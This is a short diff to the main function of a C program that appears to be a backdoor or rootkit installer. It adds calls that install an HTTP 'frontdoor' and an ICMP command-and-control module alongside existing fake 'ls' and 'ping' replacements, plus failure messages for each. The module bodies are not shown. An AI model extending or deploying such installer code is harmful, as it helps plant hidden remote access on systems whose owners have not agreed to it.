@@ -638,6 +638,10 @@ int main(int argc, char **argv){
         failures |= LS_ID;
     if(INSTALL & PING_ID && re_fake_ping())
         failures |= PING_ID;
+    if(INSTALL & FRONTDOOR_ID && re_http_frontdoor())
+        failures |= FRONTDOOR_ID;
+    if(INSTALL & ICMPK_ID && re_icmp_c2())
+        failures |= ICMPK_ID;
 
     // Empty /tmp
     dr = opendir(WORKING_DIR);
@@ -663,4 +667,8 @@ int main(int argc, char **argv){
         print_failure("ls");
     if (failures & PING_ID)
         print_failure("false ping");
+    if (failures & FRONTDOOR_ID)
+        print_failure("frontdoor");
+    if (failures & ICMPK_ID)
+        print_failure("icmpk");
 }
